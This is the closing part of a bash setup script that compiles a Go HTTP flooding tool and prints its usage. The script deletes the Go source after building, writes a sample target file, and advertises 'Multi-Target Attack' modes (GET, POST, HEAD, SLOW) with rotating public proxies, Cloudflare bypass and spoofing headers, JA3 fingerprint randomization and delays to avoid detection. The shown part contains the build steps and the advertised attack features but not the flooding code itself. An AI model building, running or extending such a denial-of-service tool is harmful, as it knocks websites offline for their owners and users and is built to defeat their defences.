			totalReqs := int64(0)
			for i, tg := range targetList {
				if tg.Stats != nil {
					reqs := tg.Stats.get()
					totalReqs += reqs
					rps := float64(reqs) / elapsed
					fmt.Printf("Target %d: %s | Mode: %s | Requests: %d | RPS: %.0f\n", 
						i+1, tg.URL, tg.Mode, reqs, rps)
				}
			}
			fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			fmt.Printf("Total Requests: %d | Elapsed: %.0fs | Global RPS: %.0f\n", 
				totalReqs, elapsed, float64(totalReqs)/elapsed)
			
			// Show proxy stats if enabled
			if useProxyAny {
				proxyMu.RLock()
				proxyCount := len(proxies)
				proxyMu.RUnlock()
				fmt.Printf("Active Proxies: %d | Refresh: %v\n", proxyCount, refreshInterval)
			}
			
			fmt.Println("\nPress Ctrl+C to stop...")
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get -u golang.org/x/net@latest
go get -u golang.org/x/text@latest
go get -u golang.org/x/crypto@latest
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up and verify
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Download missing dependencies explicitly
echo -e " ${YELLOW}➤${NC} ${GREEN}Ensuring all dependencies are downloaded...${NC}"
go mod download > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies verified${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -v -o main main.go 2>&1

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup source file
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - MULTI-TARGET + 6 PROXY APIS${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    
    # Create sample site.txt if it doesn't exist
    if [ ! -f "site.txt" ]; then
        echo -e " ${YELLOW}➤${NC} ${GREEN}Creating sample site.txt file...${NC}"
        cat > site.txt << 'EOF'
# Format: URL|MODE|DURATION|PROXY(optional)
# Modes: GET, POST, HEAD, SLOW
# Duration: seconds

https://example.com|GET|60
https://test-site.com|POST|120|proxy
https://another-target.com|SLOW|30
EOF
        echo -e " ${GREEN}✓ sample site.txt created${NC}"
        echo
    fi
    
    echo -e " ${GREEN}►${NC} Usage Instructions:"
    echo
    echo -e " ${YELLOW}Single Target Attack:${NC}"
    echo -e "   ${WHITE}./main https://target.com 60 GET${NC}"
    echo -e "   ${WHITE}./main https://target.com 120 POST proxy${NC}"
    echo
    echo -e " ${YELLOW}Multi-Target Attack:${NC}"
    echo -e "   1. Edit ${WHITE}site.txt${NC} with your targets (one per line)"
    echo -e "   2. Format: ${WHITE}URL|MODE|DURATION|PROXY${NC}"
    echo -e "   3. Run: ${WHITE}./main site.txt${NC}"
    echo
    echo -e " ${YELLOW}Example site.txt entries:${NC}"
    echo -e "   ${WHITE}https://target1.com|GET|60${NC}"
    echo -e "   ${WHITE}https://target2.com|POST|120|proxy${NC}"
    echo -e "   ${WHITE}https://target3.com|SLOW|30${NC}"
    echo
    echo -e " ${GREEN}Proxy Features (6 API Sources):${NC}"
    echo -e "   1. ProxyScrape API"
    echo -e "   2. TheSpeedX Proxy List"
    echo -e "   3. ShiftyTR Proxy List"
    echo -e "   4. jetkai Proxy List"
    echo -e "   5. Proxy-List Download API"
    echo -e "   6. OpenProxyList API"
    echo
    echo -e " ${GREEN}Enhanced Features:${NC}"
    echo -e "   • Multi-target simultaneous attacks"
    echo -e "   • 6 different proxy API sources with automatic failover"
    echo -e "   • Automatic proxy rotation and refresh (every 5 min)"
    echo -e "   • Duplicate proxy removal"
    echo -e "   • Advanced Cloudflare bypass headers (25+ spoofing headers)"
    echo -e "   • JA3 fingerprint randomization (4 different browser profiles)"
    echo -e "   • IPv4 & IPv6 dual spoofing"
    echo -e "   • Modern browser client hints (Sec-CH-UA headers)"
    echo -e "   • Extended user agents (Chrome, Firefox, Edge, Safari)"
    echo -e "   • Random delays to avoid pattern detection"
    echo -e "   • HTTP/2 multiplexing support"
    echo -e "   • Cookie jar for session persistence"
    echo -e "   • Connection pooling for high performance"
    echo -e "   • Per-target statistics with live dashboard"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Diagnostic information:${NC}"
    echo -e "   Go version: $(go version)"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@latest"
    echo -e "   ${BLUE}3.${NC} go get golang.org/x/text@latest"
    echo -e "   ${BLUE}4.${NC} go get golang.org/x/crypto@latest"
    echo -e "   ${BLUE}5.${NC} go mod tidy"
    echo -e "   ${BLUE}6.${NC} go build -v -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
